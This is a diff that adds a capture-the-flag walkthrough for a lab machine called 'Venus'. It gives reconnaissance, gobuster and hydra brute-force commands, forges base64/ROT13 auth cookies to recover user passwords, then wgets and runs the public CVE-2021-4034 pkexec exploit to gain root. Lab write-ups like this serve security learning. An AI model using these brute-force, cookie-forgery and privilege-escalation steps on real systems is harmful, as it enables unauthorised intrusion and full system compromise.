@@ -611,3 +611,292 @@ Try to read the flag again : ``` cat root_flag.txt```
 
 
 Now we got the final flag : **[root_flag_69426d9fda579afbffd9c2d47ca31d90]**
+
+
+<br></br>
+---
+<br></br>
+
+## Venus
+
+
+**1.Reconnaissance**
+
+
+Objective: Identify the target system and gather initial information.
+
+
+Netdiscover – Passive network discovery
+
+
+Nmap – Port scanning and service enumeration
+
+
+<br>
+Network Scan using Kali’s Netdiscover : ```sudo netdiscover -r <subnet>```
+
+<img width="1125" height="341" alt="image" src="https://github.com/user-attachments/assets/b7636c85-589b-400b-91d8-bab45a83eab6" />
+
+Scan report from Zenmap(Nmap GUI)<br>
+<img width="1125" height="215" alt="image" src="https://github.com/user-attachments/assets/ca416f33-d973-44c6-afd2-5acb79126335" />
+
+
+Open Ports:<br>
+22 – SSH (OpenSSH 8.5)<br>
+8080 – HTTP (WSGIServer 0.2)
+
+<br>
+
+**2. Weaponization**
+<br>
+Objective: Identify vulnerable web components and prepare for exploitation.
+
+
+Access the webpage in web browser with the machine’s IP and port for http, It will show us a login webpage: 
+
+<img width="808" height="539" alt="image" src="https://github.com/user-attachments/assets/28050685-9ce2-41b2-9448-2dc0d52503d7" />
+<br>
+
+Default login page hinted at **guest:guest** credentials
+
+Scan hidden directories using gobuster : 
+<br>
+```gobuster dir -u http://192.168.1.4:8080 -k -w /usr/share/wordlists/dirb/common.txt```
+
+<img width="952" height="476" alt="image" src="https://github.com/user-attachments/assets/b3e79020-1a88-4945-9bd2-2e508e2eb915" />
+<br>
+We got 1 result : ‘/admin’. Tried to add this path to the URL and gives me another login page : 
+<br>
+<img width="1125" height="459" alt="image" src="https://github.com/user-attachments/assets/b1be6cc8-fcc0-41f6-81df-af73103eb8f2" />
+<br>
+When I tried to login anything in this page, it gives me a ‘Server Error 500)’
+
+<img width="822" height="204" alt="image" src="https://github.com/user-attachments/assets/f6729589-25e7-45a3-935d-a44267cb424c" />
+
+
+A ‘500 Internal Server Error’ is a generic error indicating a problem on the website's server, preventing it from fulfilling a request. The issue is on the website's end, not your internet connection or browser.
+
+Now I go back to the first login page and it says ‘Credentials guest:guest can be used to access the guest account.’ So that is what im gonna do to see if it will provide us some clue : 
+
+<img width="951" height="606" alt="image" src="https://github.com/user-attachments/assets/151d7fa4-6dca-4258-adf0-be0069b5fd04" />
+<br>
+It gives me nothing, no links or anything to click that might proceed us to other page.
+
+
+
+<br>
+<br>
+
+
+**3. Delivery**
+<br>
+Objective: Deliver crafted payloads or manipulate authentication mechanisms.
+
+
+I will use burp suite to intercept the login in the machine, see if we will get some clue or something might use in the future.
+<br>
+Access the burp suite browser and go to 'IP:8080/admin'
+<br>
+Before you login. Make sure that the intercept in the burp suite is on
+<br>
+Note : my machine’s IP is change because I continued working on this in different location/ISP
+
+<img width="675" height="340" alt="image" src="https://github.com/user-attachments/assets/63cd5688-7cbe-465e-ac69-32829d2d6d82" />
+
+<br>
+<img width="1125" height="561" alt="image" src="https://github.com/user-attachments/assets/2d2a102c-fd90-4043-99e1-0a3468ff00b7" />
+<br>
+Cookie: auth="Z3Vlc3Q6dGhyZmc="
+
+Using cyberchef (https://gchq.github.io/CyberChef/), I decode the auth from base64 : <br>
+<img width="676" height="487" alt="image" src="https://github.com/user-attachments/assets/015a4427-6ded-4ea0-b8ca-43efb5bf7b98" />
+<br>
+guest:thrfg
+<br>
+This looks like a username:password pair — classic Basic Auth format <br>
+The ‘thrfg’ is also encrypted. Tried again in cyberchef but now using ROT13 and we got a result : ‘guest’
+
+<img width="911" height="562" alt="image" src="https://github.com/user-attachments/assets/fb6d0b03-9781-414b-956f-2a32275f44be" />
+<br>
+So what we have now is ‘guest:guest’
+
+<br>
+<br>
+<br>
+
+**4. Exploitation**
+<br>
+Objective: Exploit authentication to gain valid credentials.
+
+
+
+Using hydra. I will look for username that can be use. Back to login page, generate an error by inputing wrong username, copy the error message and put it in the hydra command prompt.
+
+<img width="544" height="344" alt="image" src="https://github.com/user-attachments/assets/4ef8c67a-a437-4e36-b603-a5151b81383a" />
+
+So the hydra command that I will use : <br>
+
+``` hydra -L /home/kyn/Documents/usernames.txt -p guest -s 8080 192.168.1.11 http-post-form "/:username=^USER^&password=^PASS^:Invalid username." ```
+
+<img width="1125" height="126" alt="image" src="https://github.com/user-attachments/assets/4896bdf4-ea95-41e1-813f-6e188a14f429" />
+
+Bruteforce result, we got 3 username : <br>
+-guest <br>
+-venus <br>
+-magellan
+
+Using ‘magellan’ username, go to cyberchef again to convert the ‘magellan:thrfg’ to base64
+<br>
+<img width="700" height="505" alt="image" src="https://github.com/user-attachments/assets/7e72160a-6960-402c-b939-966341952279" />
+<br>
+Output : ‘bWFnZWxsYW46dGhyZmc=’
+<br>
+This is what we will use to replace the ‘auth’ in our previous session in burp suite. Also change the username to ‘magellan’
+
+<img width="1102" height="520" alt="image" src="https://github.com/user-attachments/assets/f0da01f5-3a2d-4156-9b9e-e17db63279c4" />
+<br>
+Result for Magellan : magellan:irahfvnatrbybtl1989
+
+
+Do the same process for venus :
+<br>
+<img width="731" height="496" alt="image" src="https://github.com/user-attachments/assets/95ad7219-4e46-4dec-be21-492fd6f1beee" />
+<br>
+Base64 cyberchef result : ‘dmVudXM6dGhyZmc=’
+<br>
+<img width="881" height="422" alt="image" src="https://github.com/user-attachments/assets/d24e8fdd-9c74-4351-89b7-831baa68246a" />
+<br>
+Result for venus : venus:irahf
+
+Next, convert the encrypted password to ROT13 :
+<br>
+<img width="621" height="562" alt="image" src="https://github.com/user-attachments/assets/1df2d4d2-e0cd-4ff9-b284-35b77dbd800b" />
+<br>
+<img width="432" height="875" alt="image" src="https://github.com/user-attachments/assets/dcbf6b2f-0ed0-4983-bd37-0a051ea25d9c" />
+<br>
+Result : 
+<br>
+magellan:venusiangeology1989  (irahfvnatrbybtl1989)
+<br>
+venus:venus (irahf)
+
+<br>
+<br>
+<br>
+
+**5. Installation**
+<br>
+Objective: Establish persistence and initial foothold.
+
+Tried using the credential ssh the machine. Successfully login then explore the directory for flag :
+<br>
+<img width="1125" height="315" alt="image" src="https://github.com/user-attachments/assets/e6ffb5c4-042b-4242-8638-83764af00505" />
+<br>
+**[user_flag_e799a60032068b27b8ff212b57c200b0]**
+
+<br>
+**6. Command & Control**
+<br>
+Objective: Explore privilege escalation vectors.
+<br>
+<br>
+There is one more remaining flag. <br>
+Checked if Magellan have access to sudo and the result says it doesn’t have a sudo privilege :
+<br>
+<img width="872" height="328" alt="image" src="https://github.com/user-attachments/assets/4ec146d2-f33a-4343-8c10-bdcd48560330" />
+
+Search for files with the SUID (Set User ID) permission across the entire filesystem : 
+<br>
+```find / -perm -u=s -type f 2>/dev/null```
+
+
+SUID binaries can be privilege escalation . Misconfigured or outdated binaries (like /usr/lib/polkit-1/polkit-agent-helper-1 ) can be exploited to gain root privileges.
+<br>
+<img width="1125" height="746" alt="image" src="https://github.com/user-attachments/assets/386282e1-172f-4520-9a91-94870e2593bf" />
+
+<br>
+
+
+**7. Actions on Objectives**
+
+Exploiting CVE-2021-4034 (Polkit pkexec) :
+<br>
+Download - https://codeload.github.com/berdav/CVE-2021-4034/zip/main
+<br>
+In the device that downloaded the file, start a webserver for file transfer : 
+<br>
+``` python3 -m http-server 8080```
+<br>
+<img width="1125" height="147" alt="image" src="https://github.com/user-attachments/assets/6f0e6e2e-da81-45ff-813a-0a700ea0ea09" />
+
+<br>
+In the venus, download the file (via ssh):
+<br>
+
+```wget http://<IP address>:8080/CVE-2021-4034-main.zip```
+
+<br>
+<img width="1125" height="255" alt="image" src="https://github.com/user-attachments/assets/103352aa-13e7-4c70-a70d-77fcf1c199f5" />
+<br>
+Unzip the file :  
+
+```unzip CVE-2021-4034-main.zip```
+
+<br>
+<img width="1125" height="531" alt="image" src="https://github.com/user-attachments/assets/63ea08e6-c314-40b6-8940-54601561a9c2" />
+<br>
+Change directory : 
+
+```cd CVE-2021-4034-main```
+
+<br>
+<img width="1125" height="91" alt="image" src="https://github.com/user-attachments/assets/0ea19e5c-27af-481e-b957-6676f2604891" />
+<br>
+Run the shell script : 
+
+```./cve-2021-4034.sh```
+
+<br>
+<img width="1125" height="253" alt="image" src="https://github.com/user-attachments/assets/0e873dcf-bd24-43aa-aa70-36d89e80537c" />
+<br>
+Now try to change to root :  
+
+```su root``` 
+
+<br>
+change directory to root : 
+
+```cd /root```
+
+<img width="1125" height="284" alt="image" src="https://github.com/user-attachments/assets/a32a41c1-b3d5-464f-9d49-64c7466857cb" />
+<br>
+Check the flag text file : 
+
+```cat root_flag.txt```
+
+<br>
+<img width="1125" height="788" alt="image" src="https://github.com/user-attachments/assets/6b745c2a-2a6b-4823-942d-2b21c38f7e6d" />
+<br>
+Second flag : 
+
+**[root_flag_83588a17919eba10e20aad15081346af]**
+
+
+Privilege escalation exploits like CVE-2021-4034 highlight the importance of patch management. Outdated binaries can provide attackers with full system compromise.
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
